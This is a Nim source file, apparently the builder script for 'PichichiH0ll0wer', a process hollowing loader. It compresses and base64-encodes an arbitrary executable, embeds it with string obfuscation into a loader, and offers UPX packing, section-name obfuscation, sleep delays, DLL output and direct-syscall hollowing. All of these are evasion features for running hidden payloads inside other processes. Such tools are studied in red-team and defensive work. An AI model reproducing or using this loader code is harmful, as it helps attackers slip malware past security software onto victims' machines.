import argparse
import strformat
from std/base64 import encode
from zip/zlib import compress

# YOU HAVE TO HAVE A TOOL BANNER
const pichichiBanner = """

      ____  _      __    _      __    _    __  ______  ________                    
     / __ \(_)____/ /_  (_)____/ /_  (_)  / / / / __ \/ / / __ \_      _____  _____
    / /_/ / / ___/ __ \/ / ___/ __ \/ /  / /_/ / / / / / / / / / | /| / / _ \/ ___/
   / ____/ / /__/ / / / / /__/ / / / /  / __  / /_/ / / / /_/ /| |/ |/ /  __/ /    
  /_/   /_/\___/_/ /_/_/\___/_/ /_/_/  /_/ /_/\____/_/_/\____/ |__/|__/\___/_/     
                                                                                 

    >>  Process hollowing loader
        https://github.com/itaymigdal/PichichiH0ll0wer
        By Itay Migdal
"""

# Declare arguments
var pePath: string
var injectionMethod: string
var sponsorPath: string
var sponsorParams: string
var upx: string
var outFormat: string
var outDllExportName: string  
var sleepSeconds: string

# Define compiler args
var compileExeCmd = "nim compile --app:console"                     # exe format
var compileDllCmd = "nim compile --app:lib --nomain"                # dll format
var compileInOutExe = " -o:Loader/main.nim PichichiH0ll0wer.exe"    # for source and compiled exe names
var compileInOutDll = " -o:Loader/main.nim PichichiH0ll0wer.dll"    # for source and compiled dll names
var compileFlags = " --cpu=amd64"                                   # for windows 64 bit
compileFlags.add " -d=mingw"                                        # for cross compiling from linux
compileFlags.add " -d:release -d:strip --opt:size"                  # for minimal size
compileFlags.add " --passL:-Wl,--dynamicbase"                       # for relocation table (needed for loaders)
compileFlags.add " --benchmarkVM:on"                                # for NimProtect key randomization


when isMainModule:
    # Define arguments
    var p = newParser:
        help(pichichiBanner)
        arg("exe-file", help="Exe file to load")
        arg("injection-method", help="""Injection method

        1 - Simple hollowing
        2 - NimlineWhispers2 hollowing
        """)
        option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
        option("-a", "--args", help="Command line arguments to append to the hollowed process")
        option("-x", "--upx", help="UPX the exe and/or the hollower and obfuscate section names", choices = @["exe", "hollower", "both"])
        option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
        option("-e", "--exportname", help="Dll export name", default=some("DllRegisterServer"))
        option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
    try:
        # Parse arguments
        var opts = p.parse()
        pePath = opts.exe_file
        injectionMethod = opts.injection_method
        if opts.sponsor == "":
            sponsorPath = "getAppFilename()"
        else:
            sponsorPath = "protectString(\"" & opts.sponsor & "\")"        
        sponsorParams = opts.args
        upx = opts.upx
        outFormat = opts.format
        outDllExportName = opts.exportname
        sleepSeconds = opts.sleep
    except ShortCircuit as err:
        if err.flag == "argparse_help":
            echo err.help
            quit(1)
    except UsageError:
        stderr.writeLine getCurrentExceptionMsg()
        quit(1)

    # Read & compress & encode exe payload
    var peStr = readFile(pePath)
    var compressedPe = compress(peStr)
    var compressedBase64PE = encode(compressedPe)

    # Write the parameters to the loader params
    var paramsPath = "Loader/params.nim"
    var paramsToHollower = fmt"""
import os
import nimprotect

var compressedBase64PE* = protectString("{compressedBase64PE})"
var sponsorPath* = {sponsorPath}
var sponsorParams* = protectString(" {sponsorParams})"
var dllExportName* = protectString("{outDllExportName})" 
var sleepSeconds* = {sleepSeconds}
    """
    writeFile(paramsPath, paramsToHollower)


    
